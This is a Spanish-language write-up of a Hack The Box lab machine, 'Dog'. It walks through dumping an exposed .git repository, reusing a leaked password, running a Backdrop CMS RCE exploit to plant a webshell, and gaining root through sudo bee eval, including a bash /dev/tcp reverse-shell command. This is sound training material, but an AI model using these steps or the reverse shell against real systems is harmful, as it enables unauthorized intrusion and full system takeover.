# Informe Explotación - Dog
El informe documenta el proceso de explotación de la máquina **Dog** de Hack The Box, un entorno diseñado para poner a prueba habilidades de hacking ético y ciberseguridad. A lo largo de este informe, se detallan las fases de reconocimiento, explotación de vulnerabilidades y escalada de privilegios, con el objetivo de obtener acceso completo al sistema. Durante este ejercicio, se emplearon diversas herramientas y técnicas de explotación, incluidas vulnerabilidades en un servidor web, un CMS mal configurado y herramientas como git-dumper y bee. Al final, se alcanzó el objetivo de obtener la flag de root, demostrando la importancia de una correcta configuración y el manejo adecuado de las herramientas en entornos productivos.

## Índice
1. [Informe de Explotación - Dog](#informe-de-explotación---Dog)
2. [Información General](#información-general)
3. [Reconocimiento](#reconocimiento)
    - [Escaneo de Puertos](#escaneo-de-puertos)
    - [Enumeración de Servicios](#enumeración-de-servicios)
4. [Análisis de Vulnerabilidades](#análisis-de-vulnerabilidades)
5. [Explotación Inicial](#explotación-inicial)
6. [Post-Explotación](#post-explotación)
    - [Escalada de Privilegios](#escalada-de-privilegios)
7. [Conclusiones](#conclusiones)

## Información General
- **Nombre de la máquina:** Dog
- **Nivel de dificultad:** Fácil
- **Dirección IP:** 10.10.11.58
- **Sistema Operativo:** Linux

## Reconocimiento
### Escaneo de Puertos
Comando utilizado: 
``` bash
nmap -sC -sV 10.10.11.55
```
Resultados:
<p align="center">
  <img src="https://github.com/ElChe1/Exploitation-Lab/blob/main/HackTheBox/Easy/Dog/media/img/nmap.png" alt="nmap" style="border-radius: 10px;">
</p>

<br>

### Enumeración de Servicios
- **SSH (Puerto 22):** Servicio activo, pero sin credenciales conocidas. 
- **Web (Puerto 80):** Un servidor web está activo en el puerto 80, lo que indica que podría haber una aplicación web expuesta. Al acceder a la dirección IP del servidor, se observa que el sitio web está corriendo un CMS Backdrop en la versión 1.27.1.


## Análisis de Vulnerabilidades
### Acceso Inseguro al Directorio .git
El primer hallazgo importante durante el reconocimiento fue la accesibilidad pública del directorio `.git`. Esta configuración insegura permite que cualquier atacante pueda acceder al historial completo del repositorio de código fuente del servidor. Utilizando la herramienta git-dumper, se pudo descargar el repositorio, lo que permitió obtener información sensible como las credenciales de la base de datos (`BackDropJ2024DS2024`), lo que facilitó el acceso al CMS.

### Vulnerabilidad de Ejecución Remota de Código (RCE) en Backdrop CMS (Exploit‑DB 52021)
Tras obtener acceso al CMS, se investigaron vulnerabilidades conocidas para la versión 1.27.1 de Backdrop CMS. Se encontró un exploit público que permite ejecutar comandos arbitrarios en el servidor a través de una vulnerabilidad de ejecución remota de código (RCE). Esto se explotó con el exploit.py de Exploit-DB, lo que permitió cargar un módulo malicioso (una webshell) en el servidor.

### Configuración Incorrecta en la Instalación de Módulos
A través de la interfaz de administración del CMS, se identificó que la instalación manual de módulos permitía subir archivos maliciosos sin ningún tipo de validación adecuada, lo que fue explotado para subir la shell en formato `.tar.gz`. Esta configuración incorrecta permitió que la explotación tuviera éxito sin ningún tipo de filtrado de archivos o control adicional.


## Explotación Inicial
Durante la fase de enumeración se identificó que el directorio `.git` del servidor web era accesible de forma pública. Esta configuración insegura permitía acceder al historial completo del repositorio de desarrollo del sitio.
Se procedió a descargar el repositorio utilizando la herramienta `git-dumper`, previamente instalada en un entorno virtual de Python:
``` bash
python3 -m venv venv
source venv/bin/activate
pip install git-dumper
git-dumper http://10.10.11.58/.git/ ./dog_repo
```
<p align="center">
  <img src="https://github.com/ElChe1/Exploitation-Lab/blob/main/HackTheBox/Easy/Dog/media/img/git.png" alt="git" style="border-radius: 10px;">
</p>

<br>

**git-dumper** es una herramienta de código abierto que permite descargar repositorios de Git expuestos de manera insegura en un servidor web. Cuando un repositorio Git se configura incorrectamente y el directorio .git es accesible desde la web, git-dumper puede acceder al historial completo de ese repositorio, incluyendo los archivos, configuraciones y, en muchos casos, las credenciales sensibles que podrían haberse almacenado accidentalmente.

Durante el análisis del contenido descargado, se identificó el archivo `update.settings.json` dentro de la configuración, el cual contenía una cadena con credenciales de conexión a la base de datos MySQL.
<p align="center">
  <img src="https://github.com/ElChe1/Exploitation-Lab/blob/main/HackTheBox/Easy/Dog/media/img/settings.png" alt="settings" style="border-radius: 10px;">
</p>

<br>

Además, se localizó el correo electrónico `tiffany@dog.htb`, vinculado a un usuario administrador del CMS Backdrop.
<p align="center">
  <img src="https://github.com/ElChe1/Exploitation-Lab/blob/main/HackTheBox/Easy/Dog/media/img/tiffany.png" alt="tiffany" style="border-radius: 10px;">
</p>

<br>

Con el correo y la contraseña extraída**BackDropJ2024DS2024**, se logró acceder al panel de administración del CMS.
```text
http://10.10.11.58/?q=user/login
```

### Explotación de RCE Autenticada (Exploit‑DB 52021) 
Se investigaron vulnerabilidades para la versión de Backdrop CMS en uso (1.27.1) y se identificó una vulnerabilidad de ejecución remota de comandos autenticada (RCE), publicada en <a href='https://www.exploit-db.com/exploits/52021'>Exploit‑DB</a> bajo el ID 52021.
Se descargó y ejecutó el exploit:
```bash
python3 exploit.py http://10.10.11.58
```
<p align="center">
  <img src="https://github.com/ElChe1/Exploitation-Lab/blob/main/HackTheBox/Easy/Dog/media/img/exploit.png" alt="exploit" style="border-radius: 10px;">
</p>

<br>

Este generó un módulo malicioso shell.zip que debía ser subido manualmente a través de la interfaz del CMS **(Functionality > Install New Modules > Manual Installation)**. Sin embargo, se detectó que el sistema solo aceptaba archivos tar tgz gz y bz2, por lo que se recomprimió el módulo en formato .tar.gz:
```bash
tar -cvf shell.tar.gz shell/
```
>[!IMPORTANT]
>Al subir el archivo del módulo malicioso a través de la funcionalidad “Install New Modules > Manual Installation”, no debe rellenarse el campo **“Install Projects by name”**. Si se introduce un nombre, el sistema intentará conectarse al servidor oficial de proyectos de Backdrop (que no esta disponible o bloquear la operación), lo cual provocará un error y abortará la carga del archivo. Para que la instalación funcione correctamente, debe subirse directamente el archivo **.tar.gz** sin completar ningún otro campo.
<p align="center">
  <img src="https://github.com/ElChe1/Exploitation-Lab/blob/main/HackTheBox/Easy/Dog/media/img/subida.png" alt="subida" style="border-radius: 10px;">
</p>

<br>

Este archivo fue subido correctamente, habilitando una webshell accesible. Podemos poner comandos para saber si hay algun usuario en el sistema.
```text
http://dog.htb/modules/shell/shell.php
```
<p align="center">
  <img src="https://github.com/ElChe1/Exploitation-Lab/blob/main/HackTheBox/Easy/Dog/media/img/ls.png" alt="ls" style="border-radius: 10px;">
</p>

<br>

Entre los usuarios listados se identificaron `jobert` y `johncusack`. Se probó acceso por SSH con la contraseña previamente extraída (`BackDropJ2024DS2024`), confirmando autenticación exitosa como el usuario `johncusack`. Se consigue la flag de usuario.

## Post-Explotación
**bee** es una herramienta que se utiliza principalmente en entornos de CMS como Backdrop para ejecutar código PHP arbitrario de manera remota. En el caso de la explotación de vulnerabilidades, si un atacante obtiene acceso a un CMS y tiene permisos adecuados, puede usar bee para ejecutar comandos en el sistema.

### Escalada de Privilegios
Se consulta la posibilidad de escalar privilegios mediante el comando `sudo -l`, el cual muestra los comandos que el usuario **johncusack** puede ejecutar con privilegios elevados:
<p align="center">
  <img src="https://github.com/ElChe1/Exploitation-Lab/blob/main/HackTheBox/Easy/Dog/media/img/sudo.png" alt="sudo" style="border-radius: 10px;">
</p>

<br>

Una de las funcionalidades de <a href='https://backdropcms.org/project/bee'>**bee**</a> es la opción `eval`, que permite ejecutar código PHP arbitrario dentro del entorno de Backdrop. Se decide aprovechar esta funcionalidad para ejecutar comandos en el sistema desde la carpeta donde está instalado el CMS, en este caso, `/var/www/html`.
```bash
sudo /usr/local/bin/bee --root=/var/www/html eval "system('id');"
```
<p align="center">
  <img src="https://github.com/ElChe1/Exploitation-Lab/blob/main/HackTheBox/Easy/Dog/media/img/id.png" alt="id" style="border-radius: 10px;">
</p>

<br>


Esto confirma que el comando se ejecuta con privilegios de `root`. Al verificar que ahora estamos ejecutando como `root`, podemos proceder a obtener acceso total al sistema. Para obtener una shell interactiva como `root`, se ejecuta el siguiente comando usando la misma herramienta bee eval:
```bash
nc -lvnp 4444

sudo /usr/local/bin/bee --root=/var/www/html eval "system('bash -c \"bash -i >& /dev/tcp/10.10.16.18/4444 0>&1\"');"
```
<p align="center">
  <img src="https://github.com/ElChe1/Exploitation-Lab/blob/main/HackTheBox/Easy/Dog/media/img/shell.png" alt="shell" style="border-radius: 10px;">
</p>

<br>

Esto da acceso a una shell de **root** dentro del sistema. A partir de este momento, tenemos control total sobre la máquina, ya que el acceso con privilegios de root permite realizar cualquier acción en el sistema, como la obtención de la root flag.
<p align="center">
  <img src="https://github.com/ElChe1/Exploitation-Lab/blob/main/HackTheBox/Easy/Dog/media/img/flag.png" alt="flag" style="border-radius: 10px;">
</p>

<br>

## Conclusiones
La máquina **"Dog"** ha sido un desafío interesante que ha implicado diversas técnicas de explotación. Desde el reconocimiento inicial hasta la escalada de privilegios, cada paso ha revelado vulnerabilidades explotables que, si bien eran evidentes, requerían de un enfoque meticuloso y preciso para ser aprovechadas con éxito.

1. Reconocimiento y Explotación Inicial:
    - Durante el proceso de reconocimiento, se detectó que el directorio `.git` estaba accesible, lo que permitió obtener información sensible del repositorio mediante herramientas como `git-dumper`. Esta información, como las credenciales de la base de datos y el correo electrónico de un usuario específico, fue crucial para obtener acceso al CMS Backdrop.
    - Una vez dentro del CMS, se utilizó un exploit conocido para la versión afectada (Backdrop CMS 1.27.1) que permitió la ejecución remota de código (RCE), lo que resultó en el acceso a una web shell que permitía ejecutar comandos dentro del sistema.

2. Escalada de Privilegios:
    - Posteriormente, se descubrió que el usuario comprometido (`johncusack`) tenía permisos para ejecutar el comando `bee` sin necesidad de contraseña, lo que permitió la ejecución de comandos PHP arbitrarios. Esta vulnerabilidad se aprovechó para ejecutar comandos de sistema con privilegios de `root`, lo que facilitó la obtención de acceso total al sistema.

3. Acceso Total:
    - Tras obtener acceso como `root`, se logró acceder a la **root flag**, completando la explotación de la máquina. Esto demuestra cómo una serie de vulnerabilidades relativamente simples, pero bien aprovechadas, pueden resultar en una explotación completa de la máquina.

En resumen, esta máquina es un excelente ejemplo de cómo una serie de fallos de seguridad, aparentemente simples pero encadenados, pueden ser explotados para obtener acceso completo a un sistema. La gestión adecuada de accesos, el control de versiones y la vigilancia de servicios como CMS son cruciales para mitigar este tipo de vulnerabilidades.

<p align="center">
  <img src="https://github.com/ElChe1/Exploitation-Lab/blob/main/HackTheBox/Easy/Dog/media/img/htb.png" alt="htb" style="border-radius: 10px;">
</p>

<br>
